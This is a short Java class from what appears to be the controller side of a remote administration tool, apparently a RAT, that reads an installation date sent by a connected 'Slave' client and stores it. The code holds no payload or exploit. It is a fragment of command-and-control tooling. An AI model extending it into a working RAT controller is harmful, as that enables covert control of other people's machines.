package com.redpois0n.packets.incoming;

import java.io.DataInputStream;

import com.redpois0n.Slave;

public class Packet31InitInstallationDate extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		String date = slave.readLine();
		slave.setInstallDate(date);
	}

}
